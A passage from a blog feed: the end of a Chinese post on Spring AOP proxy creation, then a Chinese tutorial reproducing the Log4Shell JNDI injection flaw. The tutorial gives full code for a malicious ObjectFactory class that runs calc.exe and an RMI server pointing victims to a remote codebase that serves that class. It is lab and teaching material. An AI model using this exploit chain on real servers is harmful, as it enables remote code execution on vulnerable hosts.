aspectInstanceFactory<span class="token punctuation">.</span><span class="token function">getAspectMetadata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAspectClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">String</span> aspectName <span class="token operator">=</span> aspectInstanceFactory<span class="token punctuation">.</span><span class="token function">getAspectMetadata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAspectName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">validate</span><span class="token punctuation">(</span>aspectClass<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// We need to wrap the MetadataAwareAspectInstanceFactory with a decorator</span>   <span class="token comment">// so that it will only instantiate once.</span>   <span class="token class-name">MetadataAwareAspectInstanceFactory</span> lazySingletonAspectInstanceFactory <span class="token operator">=</span>         <span class="token keyword">new</span> <span class="token class-name">LazySingletonAspectInstanceFactoryDecorator</span><span class="token punctuation">(</span>aspectInstanceFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Advisor</span><span class="token punctuation">></span></span> advisors <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 收集到所有的增强器</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method <span class="token operator">:</span> <span class="token function">getAdvisorMethods</span><span class="token punctuation">(</span>aspectClass<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Prior to Spring Framework 5.2.7, advisors.size() was supplied as the declarationOrderInAspect</span>      <span class="token comment">// to getAdvisor(...) to represent the "current position" in the declared methods list.</span>      <span class="token comment">// However, since Java 7 the "current position" is not valid since the JDK no longer</span>      <span class="token comment">// returns declared methods in the order in which they are declared in the source code.</span>      <span class="token comment">// Thus, we now hard code the declarationOrderInAspect to 0 for all advice methods</span>      <span class="token comment">// discovered via reflection in order to support reliable advice ordering across JVM launches.</span>      <span class="token comment">// Specifically, a value of 0 aligns with the default value used in</span>      <span class="token comment">// AspectJPrecedenceComparator.getAspectDeclarationOrder(Advisor).</span>       <span class="token comment">// 创建增强器</span>      <span class="token class-name">Advisor</span> advisor <span class="token operator">=</span> <span class="token function">getAdvisor</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> lazySingletonAspectInstanceFactory<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> aspectName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>advisor <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         advisors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>advisor<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// If it's a per target aspect, emit the dummy instantiating aspect.</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>advisors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> lazySingletonAspectInstanceFactory<span class="token punctuation">.</span><span class="token function">getAspectMetadata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLazilyInstantiated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Advisor</span> instantiationAdvisor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SyntheticInstantiationAdvisor</span><span class="token punctuation">(</span>lazySingletonAspectInstanceFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>      advisors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> instantiationAdvisor<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Find introduction fields.</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field <span class="token operator">:</span> aspectClass<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Advisor</span> advisor <span class="token operator">=</span> <span class="token function">getDeclareParentsAdvisor</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>advisor <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         advisors<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>advisor<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> advisors<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="干扰切入点生成代理对象"><a href="#干扰切入点生成代理对象" class="headerlink" title="干扰切入点生成代理对象"></a>干扰切入点生成代理对象</h3><p>ps:干扰需要切入的对象的HelloService创建过程，会生成相关代理对象，并转为拦截器链，以便于后续执行过程</p><p>容器刷新12大步之 finishBeanFactoryInitialization(beanFactory);里面 beanFactory.preInstantiateSingletons(); 完成对剩下单实例创建的过程中</p><p>创建过程中BeanPostProcessor.postProcessAfterInitialization AOP开始增强，这个过程的时候bean已经生成，初始化的时候进行干预Bean</p><p>代码位置AbstractAutoProxyCreator.postProcessAfterInitialization</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">postProcessAfterInitialization</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Object</span> cacheKey <span class="token operator">=</span> <span class="token function">getCacheKey</span><span class="token punctuation">(</span>bean<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>earlyProxyReferences<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">)</span> <span class="token operator">!=</span> bean<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> <span class="token function">wrapIfNecessary</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> cacheKey<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> bean<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里会去找当前bean 的增强器，采用MethodMatcher通过正则表达式匹配切入点和目标类的方法。匹配完拿到目标类的增强器的时候，会执行extendAdvisors 创建一个增强器链，在第0位增加一个ExposeInvocationInterceptor拦截器（方法拦截器），接下来拿到了增强器就为当前目标类创建代理，创建时候判断当前对象是否有接口实现，<strong>如果有则使用jdk动态代理创建，如果没有接口实现则采用CGlib来进行创建代理</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Object</span> <span class="token function">wrapIfNecessary</span><span class="token punctuation">(</span><span class="token class-name">Object</span> bean<span class="token punctuation">,</span> <span class="token class-name">String</span> beanName<span class="token punctuation">,</span> <span class="token class-name">Object</span> cacheKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">hasLength</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>targetSourcedBeans<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> bean<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">FALSE</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>advisedBeans<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> bean<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isInfrastructureClass</span><span class="token punctuation">(</span>bean<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">shouldSkip</span><span class="token punctuation">(</span>bean<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>advisedBeans<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> bean<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token comment">// Create proxy if we have advice.</span>   <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> specificInterceptors <span class="token operator">=</span> <span class="token function">getAdvicesAndAdvisorsForBean</span><span class="token punctuation">(</span>bean<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>specificInterceptors <span class="token operator">!=</span> <span class="token constant">DO_NOT_PROXY</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>advisedBeans<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Object</span> proxy <span class="token operator">=</span> <span class="token function">createProxy</span><span class="token punctuation">(</span>            bean<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> specificInterceptors<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SingletonTargetSource</span><span class="token punctuation">(</span>bean<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>proxyTypes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">,</span> proxy<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> proxy<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>advisedBeans<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cacheKey<span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> bean<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="目标方法的执行"><a href="#目标方法的执行" class="headerlink" title="目标方法的执行"></a>目标方法的执行</h3><p>当目标方法执行的时候，如helloService.sayHello。这个时候会来到这个代理类设置的回调（DynamicAdvisedInterceptor）里面执行intercept。执行期间将之前的增强器通过getInterceptorsAndDynamicInterceptionAdvice转化为方法拦截器 执行invoke 的时候，链式调用。</p><p>代理对象（HelloService）包含拦截器，拦截器中包含增强器，执行的过程中会执行过滤器链，<strong>责任链模式</strong></p><ul><li><p>ExposeInvocationInterceptor 线程共享数据</p></li><li><p>MethodBeforeAdviceInterceptor 前置通知拦截器</p></li><li><p>MethodBeforeAdvice后置通知拦截器</p></li><li><p>AfterReturningAdviceInterceptor返回通知拦截器</p></li><li><p>AspectJAfterThrowingAdvice异常通知拦截器</p><p>拦截器链执行细节就不展开了</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Spring源码</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AOP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log4j漏洞复现及其原理</title>
    <link href="/posts/51961c7e.html"/>
    <url>/posts/51961c7e.html</url>
    
    <content type="html"><![CDATA[<p>将本地演示log4j漏洞的入侵原理及其修复方案</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Log4j2是一款优秀的Java日志框架，Log4j2远程代码执行漏洞，JNDI注入漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。原理：利用日志记录时候注入jndi 远程链接，jndi通过rmi 协议访问远程http服务的代码，然后将目标服务器的代码加载到当前VM来执行</p><p> JNDI（Java Naming and Directory Interface,Java命名和目录接口）。</p><p>基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI- <a href="https://xz.aliyun.com/t/7079">https://xz.aliyun.com/t/7079</a></p><h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>1、jdk&lt;1.8.0_191  这里是java1.8</p><p>JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK情况下可能会失败</p><p>原因：从 JAVA 1.8_191 起默认不信任远程 codebase，即远程 class 文件不会被自动加载，所以在 JAVA 1.8_191 及以后只能从本地 class 文件加载，但网上也有绕过，这里不细谈，详情百度</p><p>我的版本：</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220507231250197.png" alt="image-20220507231250197"></p><p>2、Apache Log4j 2.x &lt;&#x3D; 2.14.1</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li><p>攻击服务</p><ul><li>搭建一个rmi服务</li><li>启动一个nginx,并且html目录下放置恶意脚本class文件</li></ul></li><li><p>模拟业务服务 log4j-track-test 基于springboot 2.0.0.RELEASE,移除logging,并加入含log4j2是2.10.0版本的简单web应用</p></li></ul><h2 id="攻击搭建"><a href="#攻击搭建" class="headerlink" title="攻击搭建"></a>攻击搭建</h2><h3 id="恶意文件"><a href="#恶意文件" class="headerlink" title="恶意文件"></a>恶意文件</h3><p>恶意代码模拟，这里恶意模拟获取系统环境执行打开一个计算器应用：AttackService</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Name</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">.</span></span><span class="token class-name">ObjectFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2022/5/7 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AttackService</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"代码块：攻击服务器！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"静态代码块：攻击服务器！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"notepad.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">AttackService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造函数：攻击服务器！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObjectInstance</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Name</span> name<span class="token punctuation">,</span> <span class="token class-name">Context</span> nameCtx<span class="token punctuation">,</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">></span></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getObjectInstance：攻击服务器！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="ngin搭建"><a href="#ngin搭建" class="headerlink" title="ngin搭建"></a>ngin搭建</h3><p>将上述文件AttackService.java编译程AttackService.class 放于nginx htm目录下</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220507232159834.png" alt="image-20220507232159834"></p><p>启动nginx;</p><p>测试访问：<a href="https://links.jianshu.com/go?to=http://127.0.0.1:80/AttackService.class">http://127.0.0.1:80/AttackService.class</a> 可以下载到文件，这一步就算成功</p><h3 id="搭建rmi服务"><a href="#搭建rmi服务" class="headerlink" title="搭建rmi服务"></a>搭建rmi服务</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kpy<span class="token punctuation">.</span>rmi</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span></span><span class="token punctuation">;</span><span class="token comment">/** * Copyright © 2022灼华. All rights reserved. * * @author create by hyq * @version 1.0 * @date 2022/5/7 * @description: */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RmiServerRun</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1098</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 远程连接到nginx http://127.0.0.1:80/AttackService.class 执行该脚本</span>            <span class="token class-name">Reference</span> reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"AttackService"</span><span class="token punctuation">,</span>                    <span class="token string">"AttackService"</span><span class="token punctuation">,</span> <span class="token string">"http://192.168.101.11:80/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>            registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"attack"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"rmi服务端启动成功！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里启用1098端口的rmi服务，启动后绑定该端口。</p><p>192.168.101.11 是我本地的局域网端口，这里可以尝试使用127.0.0.1也是可以的</p><h2 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h2><p>搭建一个maven 工程springboot服务，pomz中dependencies文件如下</p><figure><div class="code-wrapper"><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">></span></span>            <span class="token comment">&lt;!-- 排除掉logging，不使用logback，改用log4j2 --></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-logging<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token 